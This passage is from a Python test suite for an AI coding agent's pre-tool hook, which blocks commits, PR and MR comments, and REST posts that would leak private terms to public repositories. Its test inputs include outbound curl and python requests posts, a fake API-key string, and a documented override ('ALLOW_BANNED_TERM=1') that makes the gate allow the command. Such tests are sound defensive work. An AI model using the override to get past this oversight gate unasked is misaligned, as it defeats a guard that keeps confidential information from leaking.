        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_gh_pr_comment_with_banned_term_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh pr comment 5 -R souliane/teatree --body "acmecorp asked for this"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_glab_mr_note_with_banned_term_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('glab mr note 5 -R souliane/teatree --message "acmecorp wants this"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_override_flag_bypasses_block(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('gh issue create --title t --body "acmecorp" --allow-banned-term'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_non_publish_command_is_noop(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash("ls -la"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_empty_body_publish_is_allowed(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash("gh issue create --title t"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_missing_config_fails_open(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        monkeypatch.setenv("T3_BANNED_TERMS_CONFIG", "/nonexistent/.teatree.toml")
        blocked = handle_banned_terms_pretool(_bash('gh issue create --body "acmecorp"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_scanner_crash_fails_closed_end_to_end(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1954: when the shell scanner cannot run (old interpreter / import
        # crash), the gate must BLOCK the publish, not let the body through.
        # The handler swallows exceptions to None (fail-open), so the fix is a
        # NORMAL return value (the crash marker) that survives that swallow.
        def _crash(*_args: object, **_kwargs: object) -> None:
            raise banned_terms_scanner.CommandFailedError(["check"], 1, "", "ImportError")

        monkeypatch.setattr(banned_terms_scanner, "run_allowed_to_fail", _crash)
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create -R souliane/teatree --title t --body "ship next week"')
        )
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        reason = decision["permissionDecisionReason"]
        assert "scanner" in reason.lower()
        # The crash deny must NOT misreport the internal marker as a banned term.
        assert banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER not in reason


@pytest.mark.integration
class TestCleanPublishFormsMustNotBlock:
    """Every common publish form with a clean body MUST pass the gate.

    These guard the non-sentinel pass-through path: a clean inline body or a
    readable body file must never be routed through a blocking path. They are
    forward-looking coverage, not the #182 regression guard — each would also
    pass on pre-fix code (the bug only fired on an *unresolvable* body). The
    anti-vacuous RED-before-fix guard for issue #182 is
    ``TestHookHandlerEndToEnd.test_unresolvable_body_deny_message_is_not_a_banned_term``.
    Each form below is paired with a must-FLAG counterpart in
    ``TestBannedTermPublishFormsMustBlock`` so the guards are two-sided.
    """

    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("T3_DATA_DIR", str(tmp_path / "data"))

    def test_git_commit_inline_m_clean_body_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('git commit -m "feat: ship faster builds"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_git_commit_inline_message_clean_body_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('git commit --message "fix: resolve timeout in retry loop"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_git_commit_file_absolute_path_clean_body_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "commit_msg.txt"
        body_file.write_text("feat: improve throughput\n\nDetails here.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"git commit -F {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_git_commit_long_file_flag_absolute_path_clean_body_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "commit_msg.txt"
        body_file.write_text("chore: bump dependencies\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"git commit --file {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_git_commit_c_flag_with_inline_m_clean_body_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('git -C /some/worktree commit -m "refactor: extract helper"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_gh_pr_create_inline_body_clean_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('gh pr create --title "feat" --body "Clean PR body"'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_gh_pr_create_body_file_absolute_path_clean_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "pr_body.md"
        body_file.write_text("## Summary\n\nClean description.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"gh pr create --title t --body-file {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_gh_issue_create_inline_body_clean_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create --title "Bug report" --body "Steps to reproduce..."')
        )
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_gh_issue_create_body_file_absolute_path_clean_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("## Description\n\nReproduction steps.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"gh issue create --title t --body-file {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_glab_mr_create_inline_description_clean_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(_bash('glab mr create --title "feat" --description "Clean MR body."'))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_glab_mr_create_description_file_absolute_path_clean_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "mr_body.md"
        body_file.write_text("## Summary\n\nThis MR adds a feature.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(_bash(f"glab mr create --title t --description-file {body_file}"))
        assert blocked is False
        assert capsys.readouterr().out == ""


@pytest.mark.integration
class TestBannedTermPublishFormsMustBlock:
    """The must-FLAG counterpart of ``TestCleanPublishFormsMustNotBlock``.

    A real banned term in the same publish form must still be caught after
    the fix — the fix must not weaken detection, only eliminate the sentinel
    false-positive.
    """

    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("T3_DATA_DIR", str(tmp_path / "data"))

    def test_git_commit_inline_m_banned_term_blocks(self, tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
        repo = _public_repo(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "fix the acmecorp issue"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_git_commit_file_absolute_path_banned_term_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = _public_repo(tmp_path)
        body_file = tmp_path / "commit_msg.txt"
        body_file.write_text("feat: ship acmecorp feature\n", encoding="utf-8")
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git commit -F {body_file}"},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_gh_pr_create_inline_body_banned_term_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh pr create -R souliane/teatree --title "feat" --body "Deploy to acmecorp cluster"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_gh_pr_create_body_file_absolute_path_banned_term_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "pr_body.md"
        body_file.write_text("This PR fixes the acmecorp integration.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f"gh pr create -R souliane/teatree --title t --body-file {body_file}")
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_gh_issue_create_inline_body_banned_term_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('gh issue create -R souliane/teatree --title "Bug" --body "acmecorp reports this error"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_gh_issue_create_body_file_absolute_path_banned_term_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "issue_body.md"
        body_file.write_text("acmecorp's deployment is broken.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f"gh issue create -R souliane/teatree --title t --body-file {body_file}")
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_glab_mr_create_inline_description_banned_term_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('glab mr create -R souliane/teatree --title "feat" --description "Update acmecorp config"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_glab_mr_create_description_file_absolute_path_banned_term_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        body_file = tmp_path / "mr_body.md"
        body_file.write_text("This MR updates the acmecorp adapter.\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f"glab mr create -R souliane/teatree --title t --description-file {body_file}")
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"


@pytest.mark.integration
class TestT3ReviewPostGateEndToEnd:
    """The #2278/#2270 fix end-to-end through ``handle_banned_terms_pretool``.

    Bug 1 (#2270): a clean general note posts; a banned term in the positional
    body still blocks. Bug 2: an inline post whose ``--file`` anchor points at a
    source containing a private substring posts fine — the anchored source is
    NOT the published body.
    """

    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("T3_DATA_DIR", str(tmp_path / "data"))

    def test_clean_general_note_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('t3 teatree review post-comment my-org/repo 7 "this looks good, ship it" --general')
        )
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_banned_term_general_note_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('t3 teatree review post-comment my-org/repo 7 "ping acmecorp before merge" --general')
        )
        assert blocked is True
        decision = json.loads(capsys.readouterr().out)
        assert decision["permissionDecision"] == "deny"
        assert "acmecorp" in decision["permissionDecisionReason"]

    def test_post_draft_note_banned_general_body_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        blocked = handle_banned_terms_pretool(
            _bash('t3 teatree review post-draft-note my-org/repo 7 "acmecorp wants this" --general')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_inline_post_with_anchor_source_carrying_private_substring_passes(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        source = tmp_path / "module.py"
        source.write_text("# wiring for acmecorp tenant\nx = 1\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f't3 teatree review post-comment my-org/repo 7 "Nit: rename for clarity" --file {source} --line 1')
        )
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_inline_post_with_missing_anchor_source_does_not_fail_closed(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        blocked = handle_banned_terms_pretool(
            _bash(
                't3 teatree review post-comment my-org/repo 7 "Nit: rename for clarity" --file src/absent.py --line 3'
            )
        )
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_inline_post_banned_term_in_note_still_blocks(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        source = tmp_path / "module.py"
        source.write_text("x = 1\n", encoding="utf-8")
        blocked = handle_banned_terms_pretool(
            _bash(f't3 teatree review post-comment my-org/repo 7 "acmecorp asked for this" --file {source} --line 1')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_dash_leading_note_after_end_of_options_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        # G1 RED guard: ``--`` end-of-options + a dash-leading NOTE carrying a
        # banned term published the term UNSCANNED pre-fix.
        blocked = handle_banned_terms_pretool(
            _bash('t3 teatree review post-comment my-org/repo 7 -- "--leading-dash acmecorp leak"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_env_prefixed_t3_leader_banned_note_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        # G2 RED guard: an env-prefixed ``t3`` leader escaped scanning pre-fix.
        blocked = handle_banned_terms_pretool(
            _bash('FOO=bar t3 teatree review post-comment my-org/repo 7 "acmecorp note"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_path_form_t3_leader_banned_note_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        # G2 RED guard: a path-form ``t3`` leader (``./t3``) escaped scanning.
        blocked = handle_banned_terms_pretool(_bash('./t3 teatree review post-comment my-org/repo 7 "acmecorp note"'))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"


class TestHookChainRegistration:
    def test_handler_is_wired_before_skill_load(self) -> None:
        chain = router._HANDLERS["PreToolUse"]
        names = [h.__name__ for h in chain]
        assert "handle_banned_terms_pretool" in names
        assert names.index("handle_banned_terms_pretool") < names.index("handle_enforce_skill_loading")


class TestLeadingEnvOverride:
    """A leading ``ALLOW_BANNED_TERM=1`` env-assignment token bypasses the gate (#1415).

    The Claude Code harness forwards neither an inline ``env`` block nor a
    ``--allow-banned-term`` flag glab/gh would accept; the one spelling that
    reliably reaches the gate is a leading inline env-assignment on the
    command itself.
    """

    def test_leading_env_assignment_bypasses(self) -> None:
        cmd = 'ALLOW_BANNED_TERM=1 glab mr note 5 --message "ship to acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is True

    def test_leading_env_assignment_zero_does_not_bypass(self) -> None:
        cmd = 'ALLOW_BANNED_TERM=0 glab mr note 5 --message "acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    def test_env_assignment_after_command_name_does_not_bypass(self) -> None:
        # Once the command name is reached, a later ``KEY=val``-shaped token
        # is an argument, not an inline env assignment.
        cmd = 'gh issue create --body "acmecorp" --field ALLOW_BANNED_TERM=1'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    def test_env_assignment_after_separator_does_not_bypass(self) -> None:
        cmd = 'gh issue create --body "acmecorp"; ALLOW_BANNED_TERM=1 echo done'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    def test_leading_env_assignment_behind_cd_prefix_bypasses(self) -> None:
        # The common sub-agent shape: cd into the worktree, THEN commit with the
        # override. Bash applies the assignment to the second segment's command,
        # so the override leads the segment that actually carries the publish.
        cmd = 'cd /work/ticket && ALLOW_BANNED_TERM=1 git commit -m "ship to acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is True

    def test_leading_env_assignment_behind_env_nav_prefix_bypasses(self) -> None:
        cmd = 'GIT_PAGER=cat ALLOW_BANNED_TERM=1 git commit -m "acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is True

    def test_override_segment_zero_value_does_not_bypass(self) -> None:
        cmd = 'cd /work && ALLOW_BANNED_TERM=0 git commit -m "acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    def test_chained_segment_without_override_does_not_bypass(self) -> None:
        # The override leads ONLY the first (harmless echo) segment; the publish
        # segment carries no override, so the gate must still fire on it.
        cmd = 'ALLOW_BANNED_TERM=1 echo hi && gh issue create --body "acmecorp"'
        assert banned_terms_scanner.has_override("Bash", {"command": cmd}) is False

    @pytest.mark.integration
    def test_leading_env_assignment_bypasses_block_end_to_end(self, capsys: pytest.CaptureFixture[str]) -> None:
        cmd = 'ALLOW_BANNED_TERM=1 gh issue create --title t --body "ship to acmecorp"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is False
        assert capsys.readouterr().out == ""


@pytest.mark.integration
class TestDestinationAwareGate:
    """The gate scans only affirmatively-PUBLIC targets (#1415 destination-awareness).

    A banned term posted to the probe-confirmed-public ``souliane/teatree`` is
    blocked; the same term posted to a configured internal namespace is allowed.
    A ``curl`` transport carrying no resolvable repo destination is NOT a
    ``gh``/``glab`` publish the visibility scope covers, so it keeps scanning
    (the ALL-SEGMENTS anti-leak posture) and stays blocked.
    """

    def test_banned_term_to_public_repo_is_blocked(self, capsys: pytest.CaptureFixture[str]) -> None:
        cmd = 'gh pr create -R souliane/teatree --title t --body "ship to acmecorp"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_banned_term_to_internal_namespace_is_allowed(self, capsys: pytest.CaptureFixture[str]) -> None:
        cmd = 'gh pr create -R internalcorp/private-svc --title t --body "ship to acmecorp"'
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_internal_glab_api_raw_rest_with_provable_url_target_is_allowed(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415 over-block fix: a raw ``gh``/``glab api`` WRITE carries its
        # body only to the endpoint its URL path names, so a URL that itself
        # resolves to a provably-internal project is skip-safe -- the gate no
        # longer forces the --allow-banned-term escape hatch on every private
        # MR/issue api update.
        cmd = "glab api projects/internalcorp%2Fprivate-svc/issues -f body=acmecorp"
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_public_api_raw_rest_write_is_still_blocked(self, capsys: pytest.CaptureFixture[str]) -> None:
        # The carve-out is URL-proof-scoped: the same api WRITE shape toward a
        # public repo still scans and denies.
        cmd = "gh api repos/souliane/teatree/issues -f body=acmecorp"
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_banned_term_unparseable_destination_still_blocks(self, capsys: pytest.CaptureFixture[str]) -> None:
        # A Slack-bound ``chat.postMessage`` curl is not a ``gh``/``glab`` publish
        # the visibility scope covers; it forces a scan (ALL-SEGMENTS anti-leak) and
        # the term is still blocked.
        cmd = "curl -d text=acmecorp https://slack.com/api/chat.postMessage"
        blocked = handle_banned_terms_pretool(_bash(cmd))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"


class TestPythonRestPublishGate:
    """Regression guard for the gap found via PR #2943.

    A ``python3``/``python`` REST-publish segment (``requests``/``httpx``/
    ``urllib`` POSTing/PATCHing to a forge REST API -- the "Post or Update
    Note with Images" recipe in ``skills/platforms/references/gitlab.md``)
    was never classified as a publish at all, so ``extract_publish_payload``
    returned ``None`` and the gate never even ran, on ANY repo, public or
    private.

    RED-before-fix: ``extract_publish_payload`` returned ``None`` for every
    row here, so the gate never blocked the public-repo row and never got the
    chance to skip the private-repo row -- both looked "clean" for the wrong
    reason. Mirrors the ``gh``/``glab`` structure in ``TestDestinationAwareGate``.
    """

    @staticmethod
    def _python_post(url: str) -> str:
        return (
            f"python3 -c \"import requests; requests.post('{url}', "
            "json={'body': 'ship to acmecorp'}, headers={'PRIVATE-TOKEN': token})\""
        )

    def test_extract_publish_payload_is_no_longer_none(self) -> None:
        # The core gap: pre-fix, this returned None (not a recognised publish),
        # so the gate short-circuited before ever reaching the visibility scan.
        command = self._python_post("https://api.github.com/repos/souliane/teatree/issues/5/comments")
        payload = banned_terms_scanner.extract_publish_payload("Bash", {"command": command})
        assert payload is not None
        assert "acmecorp" in payload

    def test_banned_term_via_python_post_to_public_repo_is_blocked(self, capsys: pytest.CaptureFixture[str]) -> None:
        command = self._python_post("https://api.github.com/repos/souliane/teatree/issues/5/comments")
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_banned_term_via_python_post_to_internal_namespace_is_allowed(self) -> None:
        command = self._python_post("https://gitlab.com/api/v4/projects/internalcorp%2Fprivate-svc/notes")
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is False

    def test_banned_term_via_python_post_to_allowlisted_private_repo_is_allowed(self) -> None:
        command = self._python_post("https://api.github.com/repos/acmecorp-engineering/product/issues/5/comments")
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is False

    def test_clean_python_post_to_public_repo_passes(self, capsys: pytest.CaptureFixture[str]) -> None:
        command = (
            'python3 -c "import requests; requests.post('
            "'https://api.github.com/repos/souliane/teatree/issues/5/comments', "
            "json={'body': 'clean note'}, headers={'Authorization': 'Bearer ' + token})\""
        )
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_heredoc_fed_python_post_to_public_repo_is_blocked(self, capsys: pytest.CaptureFixture[str]) -> None:
        command = (
            "python3 << 'PYEOF'\n"
            "import json, urllib.request\n"
            "url = 'https://gitlab.com/api/v4/projects/souliane%2Fteatree/merge_requests/5/notes'\n"
            "body = json.dumps({'body': 'ship to acmecorp'}).encode()\n"
            "req = urllib.request.Request(url, data=body, method='POST', "
            "headers={'PRIVATE-TOKEN': 'x'})\n"
            "urllib.request.urlopen(req)\n"
            "PYEOF"
        )
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_unrelated_python_one_liner_with_secret_shaped_string_is_not_blocked(self) -> None:
        # Independent-review finding (codex, this ticket): gating the ``-c``
        # payload walker on the python LEADER alone (not the write+forge
        # classification) fed every python ``-c`` script into
        # ``secret_scan_text`` -- which runs BEFORE ``is_publish_command`` and
        # regardless of destination -- so a purely local, non-networked
        # one-liner that merely PRINTS a secret-shaped string was false-
        # blocked as a "publish payload" it never was.
        secret = "sk-ant-api03-" + "a" * 90
        command = f"python3 -c \"token='{secret}'; print(token[:3])\""
        blocked = handle_banned_terms_pretool(_bash(command))
        assert blocked is False


class TestFormatBlockMessage:
    def test_message_names_the_term_and_the_override(self) -> None:
        message = banned_terms_scanner.format_block_message("acmecorp")
        assert "acmecorp" in message
        # The escape names the env PREFIX that works on every command, never a
        # ``--allow-banned-term`` CLI flag a ``t3 review post-comment`` subcommand
        # would reject as an unknown option (#1415).
        assert "ALLOW_BANNED_TERM=1" in message
        assert "--allow-banned-term" not in message

    def test_unresolvable_body_message_is_distinct_from_banned_term_message(self) -> None:
        message = banned_terms_scanner.format_unresolvable_body_message()
        assert "acmecorp" not in message
        assert "<unresolved publish body>" not in message
        assert "banned term" not in message

    def test_unresolvable_body_message_is_actionable(self) -> None:
        message = banned_terms_scanner.format_unresolvable_body_message()
        assert "body" in message.lower()
        assert "--allow-banned-term" not in message


class TestFormatScannerUnavailableMessage:
    def test_message_names_the_scanner_and_is_not_a_banned_term(self) -> None:
        message = banned_terms_scanner.format_scanner_unavailable_message()
        assert "scanner" in message.lower()
        assert banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER not in message
        assert "banned term" not in message

    def test_message_points_at_the_interpreter_requirement(self) -> None:
        # The actionable fix for the #1954 misconfig is installing uv or a
        # Python >= 3.13; the deny reason must point the operator at it.
        message = banned_terms_scanner.format_scanner_unavailable_message()
        assert "uv" in message.lower() or "python" in message.lower()


class TestMarkerDenyMessage:
    def test_scanner_unavailable_marker_maps_to_its_message(self) -> None:
        message = banned_terms_scanner.marker_deny_message(banned_terms_scanner.SCANNER_UNAVAILABLE_MARKER)
        assert message == banned_terms_scanner.format_scanner_unavailable_message()

    def test_unresolvable_body_marker_maps_to_its_message(self) -> None:
        message = banned_terms_scanner.marker_deny_message(banned_terms_scanner.UNRESOLVABLE_BODY_MARKER)
        assert message == banned_terms_scanner.format_unresolvable_body_message()

    def test_real_term_is_not_a_marker(self) -> None:
        assert banned_terms_scanner.marker_deny_message("acmecorp") is None


@pytest.mark.integration
class TestPrivateRepoCarveOut:
    """A private-repo commit with the repo's own domain word is ALLOWED (#126)."""

    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("T3_DATA_DIR", str(tmp_path / "data"))

    def test_private_repo_commit_with_domain_word_is_allowed(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = _private_repo(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "fix the acmecorp refinery"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_private_repo_commit_bodyfile_relative_path_reset_cwd_is_allowed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The real cold-hook failure: a ``git -C <worktree> commit -F <relpath>``
        # where the harness cwd has reset AWAY from the worktree. The body file
        # lives INSIDE the private worktree and carries the repo's own domain
        # word. Reading the ``-F`` path against the reset cwd fails, so the
        # parser fail-closes to the sentinel and the carve-out never consults
        # the private origin -> a false hard-block. The body file IS resolvable
        # from the commit's own repo dir, so the carve-out must downgrade.
        repo = _private_repo(tmp_path)
        (repo / "commit_body.txt").write_text("fix the acmecorp refinery\n", encoding="utf-8")
        monkeypatch.chdir(tmp_path)  # reset-away cwd, not the worktree
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git -C {repo} commit -F commit_body.txt"},
            "cwd": str(tmp_path),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_public_repo_commit_bodyfile_relative_path_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # Regression guard symmetric to the fix: the same ``-F <relpath>`` shape
        # whose body the gate now resolves from the commit's repo dir must STILL
        # hard-block when that repo is PUBLIC. The resolution fix must not weaken
        # the real protection -- a banned term in a body file committed to a
        # public repo is a leak.
        repo = tmp_path / "pub"
        repo.mkdir()
        _git(repo, "init", "-b", "main")
        _git(repo, "remote", "add", "origin", "https://github.com/some/public.git")
        (repo / "commit_body.txt").write_text("ship to acmecorp\n", encoding="utf-8")
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git -C {repo} commit -F commit_body.txt"},
            "cwd": str(tmp_path),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_commit_bodyfile_genuinely_missing_on_private_repo_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # A ``-F`` path that exists NOWHERE (not in cwd, not in the repo dir) is a
        # genuinely unresolvable body. On a known-PRIVATE landing repo this must
        # DOWNGRADE to warn, not hard-block (#1415): the commit lands in private
        # history regardless of whether the gate could read the body, so an unread
        # body cannot leak. The #1207 fail-closed sentinel contract is preserved
        # only where it protects against a leak -- a PUBLIC destination (the paired
        # public guards below + ``test_public_repo_commit_bodyfile_relative_path_
        # still_blocks``); a private destination is not a public surface.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git -C {repo} commit -F does_not_exist.txt"},
            "cwd": str(tmp_path),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_commit_bodyfile_genuinely_missing_on_provably_public_repo_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415: a genuinely-missing ``-F`` path landing in a PROBE-CONFIRMED-PUBLIC
        # repo now DOWNGRADES to warn, not hard-block. A ``git commit`` is LOCAL --
        # the message enters only local history until a push -- and the dedicated
        # pre-push gate (``refuse-public-push-with-leak.sh``, #703) re-scans EVERY
        # commit message in the push range for banned terms before they reach a
        # public remote. The commit-time hard-block on an unreadable body to a
        # public repo was a pure over-block that stuck multiple coders mid-commit;
        # the real public-surface protection is the paired READABLE-term guard
        # (``...public_commit_with_banned_term_still_blocks``) and the public
        # ``gh``/``glab`` post path, both of which still hard-block.
        repo = tmp_path / "pub"
        repo.mkdir()
